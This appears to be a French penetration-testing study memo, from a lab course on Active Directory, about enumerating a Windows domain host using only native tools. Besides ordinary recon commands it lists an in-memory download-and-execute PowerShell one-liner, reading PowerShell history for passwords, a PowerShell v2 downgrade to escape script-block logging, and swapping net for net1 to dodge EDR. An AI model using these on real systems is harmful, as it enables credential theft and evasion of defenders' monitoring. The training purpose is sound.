# Mémo — Living Off the Land (énum avec les outils natifs Windows)

> Suite de [l'énum credentialed depuis Windows](memo-enum-credentialed-windows.md).
> **Scénario** : hôte managé **sans accès internet**, impossible de déposer un outil dessus. Le client veut voir
> ce qu'on peut énumérer **uniquement avec les outils natifs** Windows/AD → « living off the land ».
> 💡 Approche **plus furtive** : moins de logs/alertes que de tirer un outil depuis l'extérieur (IDS/IPS, EDR,
> baseline de trafic). Domaine : `INLANEFREIGHT.LOCAL`, DC = `ACADEMY-EA-DC01`, hôte = `MS01`.

---

## 1. Recon hôte & réseau (commandes env)

| Commande | Résultat |
|----------|----------|
| `hostname` | Nom du PC. |
| `[System.Environment]::OSVersion.Version` | Version OS + niveau de révision. |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patches & hotfixes appliqués. |
| `ipconfig /all` | État & config des adaptateurs réseau (segment réseau). |
| `set` | Variables d'environnement de la session (CMD). |
| `echo %USERDOMAIN%` | Domaine auquel appartient l'hôte (CMD). |
| `echo %logonserver%` | Nom du DC où l'hôte s'authentifie (CMD). |

> 💡 **`systeminfo`** = tout ça en **une seule commande** → une commande = moins de logs = moins de chances d'être repéré.

---

## 2. PowerShell (OPSEC)

| Cmdlet | Rôle |
|--------|------|
| `Get-Module` | Modules chargés / dispo. |
| `Get-ExecutionPolicy -List` | Execution policy par scope. |
| `Set-ExecutionPolicy Bypass -Scope Process` | Bypass **temporaire** (revient à la sortie du process → pas de modif permanente). |
| `Get-ChildItem Env: \| ft Key,Value` | Variables d'env (chemins, users, infos machine). |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | **Historique PowerShell** du user → souvent des **mots de passe** / chemins de scripts/configs. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <cmds>"` | Télécharger + exécuter en **mémoire**. |

### Downgrade PowerShell (anti-logging)
Le **Script Block Logging** (event `4104`) et le PS logging existent depuis **PowerShell 3.0**. Si une v2 (ou +) est
toujours installée, on peut la rappeler pour que nos actions **ne soient plus loggées**.

```powershell
Get-Host                 # vérifier la version courante (ex. 5.1.x)
powershell.exe -version 2 # downgrade vers la v2
Get-Host                 # Version : 2.0 → downgrade confirmé
```
- Logs à surveiller : `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational` (event **4104**)
  et `Applications and Services Logs > Windows PowerShell` (event **400** à chaque démarrage d'instance).
- ⚠️ **Gotcha** : la commande `powershell.exe -version 2` **est elle-même loggée** (event 400, HostVersion 2.0).
  Un défenseur vigilant verra le downgrade + l'arrêt brutal du remplissage des logs → déclencheur d'investigation.

---

## 3. Vérifier les défenses

```powershell
netsh advfirewall show allprofiles     # état du pare-feu (Domain/Private/Public : State ON/OFF)
```
```cmd
sc query windefend                      # Defender tourne-t-il ? (STATE : RUNNING) — depuis CMD
```
```powershell
Get-MpComputerStatus                    # config/état complet Defender
```
- `Get-MpComputerStatus` : `RealTimeProtectionEnabled`, `IsTamperProtected`, versions de signatures, âge/fréquence des scans...
- Utile en **reporting** : les défenseurs croient souvent des réglages actifs/scans planifiés qui ne le sont pas → findings de remédiation.

### Suis-je seul sur l'hôte ?
```powershell
qwinsta                                 # sessions ouvertes (Active/Disc/Listen) + users connectés
```
> ⚠️ Si quelqu'un d'autre est en session, une popup / une déconnexion peut le faire réagir (report, changement de mdp) → perte du foothold.

---

## 4. Infos réseau

| Commande | Rôle |
|----------|------|
| `arp -a` | Hôtes connus dans la table ARP (voisins déjà contactés). |
| `ipconfig /all` | Config adaptateurs → segment réseau. |
| `route print` | Table de routage (IPv4/IPv6) : réseaux connus & routes L3. |
| `netsh advfirewall show allprofiles` | État du pare-feu (filtre-t-il ?). |

> 💡 `arp -a` + `route print` = **candidats au pivot** : tout réseau dans la table de routage est une cible de mouvement
> latéral (route ajoutée = réseau accédé/administré). Précieux en **black box** pour limiter le scan.

---

## 5. WMI (Windows Management Instrumentation)

| Commande | Rôle |
|----------|------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patch level & hotfixes. |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Infos de base de l'hôte. |
| `wmic process list /format:list` | Tous les process. |
| `wmic ntdomain list /format:list` | Infos domaine & **DC** (dont child domains / forêts en trust). |
| `wmic useraccount list /format:list` | Comptes locaux + comptes domaine ayant loggé sur l'hôte. |
| `wmic group list /format:list` | Groupes locaux. |
| `wmic sysaccount list /format:list` | Comptes système utilisés comme comptes de service. |

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```
→ révèle domaine, **child domain** (`LOGISTICS`) et **forêt externe** en trust (`FREIGHTLOGISTICS.LOCAL`) + adresses des DC.

---

## 6. Net commands

Interrogent hôte local & distants (users, groupes, hôtes, DC, policy de mdp...).
> ⚠️ `net.exe` est **souvent surveillé par les EDR**. Certaines orgs alertent si un user d'une OU précise lance
> `whoami` / `net localgroup administrators`. **Astuce OPSEC : `net1` fait la même chose que `net`** sans trigger la string « net ».

| Commande | Rôle |
|----------|------|
| `net accounts` / `net accounts /domain` | Exigences de mdp / policy lockout du domaine. |
| `net group /domain` | Groupes du domaine. |
| `net group "Domain Admins" /domain` | Membres des **Domain Admins**. |
| `net group "Domain Controllers" /domain` | Comptes machine des DC. |
| `net group "domain computers" /domain` | PC joints au domaine. |
| `net localgroup` | Tous les groupes locaux. |
| `net localgroup administrators /domain` | Admins du domaine (inclut Domain Admins par défaut). |
| `net user <user> /domain` | Infos d'un user du domaine (groupes, pwd set/expire...). |
| `net user /domain` | Tous les users du domaine. |
| `net user %username%` | Infos du user courant. |
| `net view` / `net view /domain` | Liste des PC / PC du domaine. |
| `net view \\<host> /ALL` | Partages d'un hôte. |
| `net share` | Partages locaux. |

---

## 7. Dsquery (natif, présent partout)

DLL `C:\Windows\System32\dsquery.dll` présente sur tout Windows moderne (et le binaire sur tout hôte avec le rôle
**AD DS**). Requiert des **privilèges élevés** ou un contexte **SYSTEM**. Réplique BloodHound/PowerView quand on n'a rien d'autre.

```cmd
dsquery user                                    # objets user (DN)
dsquery computer                                # objets computer (DN)
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"  # wildcard : tous les objets d'une OU/conteneur
```

Avec filtres LDAP :
```cmd
:: users avec PASSWD_NOTREQD (flag UAC 32)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

:: Domain Controllers (flag UAC 8192), limité à 5
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

### Filtres LDAP — à comprendre (réutilisable AD PowerShell, ldapsearch...)
- `userAccountControl:1.2.840.113556.1.4.803:` = on regarde l'attribut **UAC** d'un objet.
- `=8192` = bitmask décimal à matcher (ici = DC). Autres exemples : `32` = PASSWD_NOTREQD, `64` = Password Can't Change.

**Règles de matching (OID) :**
| OID | Sens |
|-----|------|
| `1.2.840.113556.1.4.803` | Match **exact** du bit (un attribut précis). |
| `1.2.840.113556.1.4.804` | Match si **n'importe quel** bit de la chaîne correspond (objet à attributs multiples). |
| `1.2.840.113556.1.4.1941` | Match sur le **DN** : parcourt ownership & membership (chaîne d'appartenance). |

**Opérateurs logiques :** `&` (et), `|` (ou), `!` (non).
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))    # user ET "Password Can't Change"
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))   # user SANS ce flag
```

---

## 8. À retenir

| Besoin | Commande native |
|--------|-----------------|
| Snapshot hôte complet | `systeminfo` (1 cmd = moins de logs) |
| Patches | `wmic qfe get ...` |
| Historique PS (mdp !) | `Get-Content $env:APPDATA\...\ConsoleHost_history.txt` |
| Échapper au Script Block Logging | `powershell.exe -version 2` (⚠️ le downgrade reste loggé) |
| Defender actif ? | `sc query windefend` / `Get-MpComputerStatus` |
| Pare-feu | `netsh advfirewall show allprofiles` |
| Suis-je seul ? | `qwinsta` |
| Candidats au pivot | `arp -a` + `route print` |
| Domaine / child / trusts | `wmic ntdomain get ...` |
| Users/groupes/policy | `net` (ou **`net1`** pour éviter l'EDR) |
| Énum AD sans outil | `dsquery` + filtres LDAP (UAC + OID) |
